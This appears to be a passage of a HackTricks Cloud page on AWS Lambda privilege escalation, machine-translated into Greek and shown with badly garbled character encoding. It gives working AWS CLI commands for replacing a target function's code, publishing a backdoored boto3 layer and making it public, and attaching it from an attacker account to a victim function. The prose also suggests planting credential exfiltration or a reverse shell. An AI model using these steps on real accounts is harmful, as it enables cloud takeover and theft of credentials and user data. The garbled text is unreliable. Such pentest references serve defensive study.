ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î·Ï‚ lambda Î³Î¹Î± Î½Î± ÎµÎ¾Î¬Î³ÎµÎ¹ Ï„Î± IAM credentials**.

Î‘Î½ ÎºÎ±Î¹ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ Î­Ï‡ÎµÎ¹ Ï„Î·Î½ Î¬Î¼ÎµÏƒÎ· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±, Î±Î½ Î· Lambda function ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿Ï‹Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± ÎºÎ±Î¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ®, ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¸Î±Î½ÏŒ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¼Î­ÏƒÏ‰ Ï…Ï€Î±ÏÏ‡ÏŒÎ½Ï„Ï‰Î½ ÏÎ¿ÏÎ½ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚ Î® Î³ÎµÎ³Î¿Î½ÏŒÏ„Ï‰Î½, Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½Î¿Î½Ï„Î±Ï‚ Î­Ï„ÏƒÎ¹ Î­Î¼Î¼ÎµÏƒÎ± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï… ÎºÏÎ´Î¹ÎºÎ±.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Î Î¹Î¸Î±Î½ÏŒÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚:** Î†Î¼ÎµÏƒÎ· privesc ÏƒÏ„Î¿Î½ ÏÏŒÎ»Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ lambda Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹.

### `lambda:UpdateFunctionConfiguration`

#### Î•Î¹ÏƒÎ±Î³Ï‰Î³Î®

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÏƒÏ…Î¼Ï€ÎµÏÎ¯Î»Î·ÏˆÎ· **ÎºÏÎ´Î¹ÎºÎ±** ÏƒÏ„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± lambda Î±Î»Î»Î¬ **Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î¬Ï‚ Ï„Î¿Î½ Î¾ÎµÏ‡Ï‰ÏÎ¹ÏƒÏ„Î¬**, Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï„Î·Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚ Î½Î± Ï€Î±ÏÎ±Î¼Î­Î½ÎµÎ¹ Î¼Î¹ÎºÏÏŒÏ‚ ÎºÎ±Î¹ **Ï€Î¿Î»Î»Î­Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ Î½Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î¼Î¿Î¹ÏÎ¬Î¶Î¿Î½Ï„Î±Î¹ ÎºÏÎ´Î¹ÎºÎ±**.

ÎœÎ­ÏƒÎ± ÏƒÏ„Î· lambda Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¹Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚ Î±Ï€ÏŒ ÏŒÏ€Î¿Ï… Ï†Î¿ÏÏ„ÏÎ½ÎµÏ„Î±Î¹ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ python Î¼Îµ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÏŒÏ€Ï‰Ï‚ Î· Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Î‘Ï…Ï„Î¬ ÎµÎ¯Î½Î±Î¹ Ï„Î± Î¼Î­ÏÎ·:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· boto3 Ï†Î¿ÏÏ„ÏÎ½ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ `/var/runtime/boto3` (4Î· Î¸Î­ÏƒÎ·).

#### Exploitation

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± `lambda:UpdateFunctionConfiguration` Î³Î¹Î± Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Î­Î½Î± Î½Î­Î¿ layer** ÏƒÎµ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± lambda. Î“Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ ÎºÏÎ´Î¹ÎºÎ±, Î±Ï…Ï„ÏŒ Ï„Î¿ layer Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹Î± **Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Ï€Î¿Ï… Î· lambda Ï€ÏÏŒÎºÎµÎ¹Ï„Î±Î¹ Î½Î± ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹.** Î‘Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î·Ï‚ lambda, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Ï„Î¿ Î²ÏÎµÎ¯Ï„Îµ ÎµÏÎºÎ¿Î»Î±, ÎµÏ€Î¯ÏƒÎ·Ï‚ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î· lambda Î½Î± **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î®Î´Î· Î­Î½Î± layer** ÎºÎ±Î¹ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ** Ï„Î¿ layer ÎºÎ±Î¹ Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ¬ ÏƒÎ±Ï‚** ÎµÎºÎµÎ¯.

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Ï‚ Ï…Ï€Î¿Î¸Î­ÏƒÎ¿Ï…Î¼Îµ ÏŒÏ„Î¹ Î· lambda Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· boto3, Î±Ï…Ï„ÏŒ Î¸Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± Ï„Î¿Ï€Î¹ÎºÏŒ layer Î¼Îµ Ï„Î·Î½ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î·Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·Ï‚:
```
pip3 install -t ./lambda_layer boto3
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½Î¿Î¯Î¾ÎµÏ„Îµ Ï„Î¿ `./lambda_layer/boto3/__init__.py` ÎºÎ±Î¹ **Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î¿ backdoor ÏƒÏ„Î¿Î½ global ÎºÏÎ´Î¹ÎºÎ±** (Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î³Î¹Î± ÎµÎ¾Î±Î³Ï‰Î³Î® Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î·ÏÎ¯Ï‰Î½ Î® Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Î­Î½Î± reverse shell Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±).

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÏƒÏ…Î¼Ï€Î¹Î­ÏƒÏ„Îµ Ï„Î¿Î½ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ `./lambda_layer` ÎºÎ±Î¹ **Î±Î½ÎµÎ²Î¬ÏƒÏ„Îµ Ï„Î¿ Î½Î­Î¿ lambda layer** ÏƒÏ„Î¿Î½ Î´Î¹ÎºÏŒ ÏƒÎ±Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ (Î® ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚, Î±Î»Î»Î¬ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ Î­Ï‡ÎµÏ„Îµ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î³Î¹Î± Î±Ï…Ï„ÏŒ).\
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ Ï†Î¬ÎºÎµÎ»Î¿ python ÎºÎ±Î¹ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ ÎµÎºÎµÎ¯ Î³Î¹Î± Î½Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿ /opt/python/boto3. Î•Ï€Î¯ÏƒÎ·Ï‚, Ï„Î¿ layer Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ **ÏƒÏ…Î¼Î²Î±Ï„ÏŒ Î¼Îµ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· python** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ lambda ÎºÎ±Î¹ Î±Î½ Ï„Î¿ Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ ÏƒÎ±Ï‚, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î·Î½ **Î¯Î´Î¹Î± Ï€ÎµÏÎ¹Î¿Ï‡Î®:**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Î¤ÏÏÎ±, ÎºÎ¬Î½Ï„Îµ Ï„Î¿ Î±Î½ÎµÎ²Î±ÏƒÎ¼Î­Î½Î¿ lambda layer **Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î¿ Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
```markdown
And attach the lambda layer to the victim lambda function:

ÎšÎ±Î¹ ÎµÏ€Î¹ÏƒÏ…Î½Î¬ÏˆÏ„Îµ Ï„Î¿ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ lambda ÏƒÏ„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± lambda Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚:
```
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Î¤Î¿ ÎµÏ€ÏŒÎ¼ÎµÎ½Î¿ Î²Î®Î¼Î± Î¸Î± Î®Ï„Î±Î½ ÎµÎ¯Ï„Îµ Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î¼Îµ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±** ÎµÎ¼ÎµÎ¯Ï‚ Î¿Î¹ Î¯Î´Î¹Î¿Î¹ Î±Î½ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ, ÎµÎ¯Ï„Îµ Î½Î± Ï€ÎµÏÎ¹Î¼Î­Î½Î¿Ï…Î¼Îµ Î¼Î­Ï‡ÏÎ¹ Î½Î± **ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯** Î¼Îµ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¬ Î¼Î­ÏƒÎ±â€“Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î· Î±ÏƒÏ†Î±Î»Î­ÏƒÏ„ÎµÏÎ· Î¼Î­Î¸Î¿Î´Î¿Ï‚.

ÎˆÎ½Î±Ï‚ **Ï€Î¹Î¿ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒÏ‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ ÏƒÏ„Î¿:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Î Î¹Î¸Î±Î½ÏŒÏ‚ Î‘Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï‚:** Î†Î¼ÎµÏƒÎ¿ privesc ÏƒÏ„Î¿Î½ ÏÏŒÎ»Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ lambda Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

ÎŠÏƒÏ‰Ï‚ Î¼Îµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î½Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± ÎºÎ±Î¹ Î½Î± Ï„Î·Î½ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ ÎºÎ±Î»ÏÎ½Ï„Î±Ï‚ Ï„Î¿ URL... Î±Î»Î»Î¬ Î´ÎµÎ½ Î¼Ï€ÏŒÏÎµÏƒÎ± Î½Î± Î²ÏÏ‰ Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î½Î± Ï„Î¿ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÏ‰, Î¿Ï€ÏŒÏ„Îµ ÎµÎ½Î·Î¼ÎµÏÏÏƒÏ„Îµ Î¼Îµ Î±Î½ Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ!

### Lambda MitM

ÎšÎ¬Ï€Î¿Î¹ÎµÏ‚ lambdas Î¸Î± **Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÏƒÎµ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚.** Î‘Î½ Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ RCE ÏƒÎµ Î¼Î¯Î± Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ¾Î¬Î³ÎµÏ„Îµ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î¿Ï… ÏƒÏ„Î­Î»Î½Î¿Ï…Î½ Î¬Î»Î»Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÏƒÎµ Î±Ï…Ï„Î®Î½, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¿ ÏƒÏ„Î¿:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± github.

</details>
{% endhint %}
